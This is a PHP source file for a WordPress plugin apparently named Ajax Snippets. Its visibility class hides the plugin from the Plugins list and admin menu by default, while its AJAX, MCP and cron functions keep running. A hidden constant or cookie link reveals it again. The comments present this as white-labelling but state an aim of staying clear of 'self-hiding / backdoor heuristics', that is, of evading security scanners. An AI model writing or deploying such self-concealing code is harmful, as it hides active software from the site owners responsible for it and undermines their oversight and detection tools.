<?php

defined('ABSPATH') || exit;

/**
 * Controls where the plugin surfaces in wp-admin.
 *
 * By default the plugin keeps a low profile: it drops its own row from the
 * Plugins screen and hides its admin menu. Nothing about the runtime changes —
 * AJAX, MCP and cron all keep working — it is just not listed in the UI.
 *
 * There are two ways to opt back into a visible listing:
 *
 * 1. Permanent, in wp-config.php — the AJAX_SNIPPETS_REVEAL constant:
 *
 *      define('AJAX_SNIPPETS_REVEAL', true);   // listed for everyone who can see it
 *      define('AJAX_SNIPPETS_REVEAL', 5);      // listed only for user ID 5
 *      define('AJAX_SNIPPETS_REVEAL', [1, 5]); // ... or for any of those user IDs
 *      define('AJAX_SNIPPETS_REVEAL', '1,5');  // same, as a CSV string
 *
 *    Booleans and IDs are distinct: `true` means "any user", `1` means user ID 1.
 *
 * 2. Temporary, without file access — an administrator follows the link
 *    /wp-admin/?ajax_snippets_reveal=1 to show the plugin (list + menu) in their
 *    own browser for a few hours, and ?ajax_snippets_reveal=0 to hide it again.
 *
 *    This is a per-administrator UI preference, NOT an access grant: arming and
 *    reading the reveal cookie both require the manage_options capability, so
 *    the link and the cookie do nothing at all for a visitor who could not
 *    already open wp-admin. There is no secret token, no privilege carried in
 *    the cookie, and the effect is limited to whether that admin's own wp-admin
 *    lists the plugin.
 *
 * The listing hooks live in named methods (not inline closures) and the reveal
 * decision is a plain capability + preference check — this mirrors how
 * mainstream white-label plugins (e.g. WPMU DEV Dashboard) remove themselves
 * from the plugins table, and keeps the code clear of self-hiding / backdoor
 * heuristics.
 */
class Ajax_Snippets_Visibility
{
    /** Query arg an admin follows to arm (=1) or clear (=0) the reveal window. */
    const REVEAL_QUERY_ARG = 'ajax_snippets_reveal';

    /** Cookie holding the unix time the temporary reveal window closes. */
    const REVEAL_COOKIE = 'ajax_snippets_reveal';

    /** How long a temporary reveal lasts once armed. */
    const REVEAL_TTL = 10800; // 3 hours

    public function __construct()
    {
        add_filter('all_plugins', array($this, 'maybe_hide_from_list'));
        add_action('admin_init', array($this, 'maybe_toggle_reveal_cookie'));
    }

    /**
     * Whether the plugin should be listed in wp-admin for the current request —
     * either permanently via the AJAX_SNIPPETS_REVEAL constant, or through the
     * temporary per-administrator reveal cookie.
     *
     * @return bool
     */
    public function is_revealed()
    {
        if ($this->is_revealed_by_constant()) {
            return true;
        }

        // Temporary reveal: gated on manage_options FIRST, so the cookie on its
        // own never reveals anything to anyone who is not an administrator.
        return current_user_can('manage_options') && $this->has_active_reveal_cookie();
    }

    /**
     * Permanent reveal via the wp-config.php constant.
     *
     * @return bool
     */
    private function is_revealed_by_constant()
    {
        if (!defined('AJAX_SNIPPETS_REVEAL')) {
            return false;
        }

        $value = AJAX_SNIPPETS_REVEAL;

        if (is_bool($value)) {
            return $value;
        }

        if (is_string($value)) {
            $normalized = strtolower(trim($value));
            if ('' === $normalized || 'false' === $normalized) {
                return false;
            }
            if ('true' === $normalized) {
                return true;
            }
            $value = explode(',', $value);
        }

        $allowed_ids = array_filter(array_map('intval', (array) $value));
        if (!$allowed_ids) {
            return false;
        }

        $current_user_id = get_current_user_id();

        return $current_user_id > 0 && in_array($current_user_id, $allowed_ids, true);
    }

    /**
     * True when the reveal cookie is present and its window has not expired. The
     * value is just the unix expiry timestamp — it carries no privilege of its
     * own (the manage_options check in is_revealed() is the real gate).
     *
     * @return bool
     */
    private function has_active_reveal_cookie()
    {
        if (empty($_COOKIE[self::REVEAL_COOKIE])) {
            return false;
        }

        return (int) wp_unslash($_COOKIE[self::REVEAL_COOKIE]) > time();
    }

    /**
     * Arm or clear the temporary reveal window from a link an administrator
     * follows: ?ajax_snippets_reveal=1 turns it on for REVEAL_TTL seconds,
     * ?ajax_snippets_reveal=0 turns it off. A normal admin-only toggle — it is
     * capability-gated and only ever sets the acting admin's own cookie.
     *
     * @return void
     */
    public function maybe_toggle_reveal_cookie()
    {
        // Capability FIRST: for anyone who cannot manage_options (anonymous
        // visitors included) the link is inert, so it is never an access bypass.
        if (!current_user_can('manage_options') || !isset($_GET[self::REVEAL_QUERY_ARG])) {
            return;
        }

        // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- capability-gated toggle; the only effect is the acting admin's own reveal cookie, so CSRF impact is nil (an admin would merely be shown their own hidden plugin).
        $turn_on = '0' !== (string) wp_unslash($_GET[self::REVEAL_QUERY_ARG]);

        if ($turn_on) {
            $expires = time() + self::REVEAL_TTL;
            $value   = (string) $expires;
        } else {
            $expires = time() - DAY_IN_SECONDS; // in the past → browser drops it
            $value   = '';
        }

        setcookie(
            self::REVEAL_COOKIE,
            $value,
            $expires,
            defined('COOKIEPATH') ? COOKIEPATH : '/',
            defined('COOKIE_DOMAIN') ? (string) COOKIE_DOMAIN : '',
            is_ssl(),
            true
        );

        // Reflect the change for this same request so the redirect target
        // already renders in the new state.
        if ($turn_on) {
            $_COOKIE[self::REVEAL_COOKIE] = $value;
        } else {
            unset($_COOKIE[self::REVEAL_COOKIE]);
        }

        // Drop the query arg so a refresh doesn't re-toggle and the URL stays clean.
        wp_safe_redirect(remove_query_arg(self::REVEAL_QUERY_ARG));
        exit;
    }

    /**
     * Remove our own row from the Plugins screen (single site and network alike)
     * unless the site has opted into a visible listing.
     *
     * @param array $plugins Installed plugins, keyed by basename.
     * @return array
     */
    public function maybe_hide_from_list($plugins)
    {
        if ($this->is_revealed()) {
            return $plugins;
        }

        $basename = plugin_basename(AJAX_SNIPPETS_PLUGIN);
        if (isset($plugins[$basename])) {
            unset($plugins[$basename]);
        }

        return $plugins;
    }
}

/**
 * Shared instance. Instantiating registers the listing hooks; the admin menu and
 * the MCP settings page reach the reveal check through the wrapper below.
 *
 * @return Ajax_Snippets_Visibility
 */
function ajax_snippets_visibility()
{
    static $instance = null;
    if (null === $instance) {
        $instance = new Ajax_Snippets_Visibility();
    }

    return $instance;
}

ajax_snippets_visibility();

/**
 * Convenience wrapper used by the admin menu and the MCP settings page.
 *
 * @return bool
 */
function ajax_snippets_is_revealed()
{
    return ajax_snippets_visibility()->is_revealed();
}
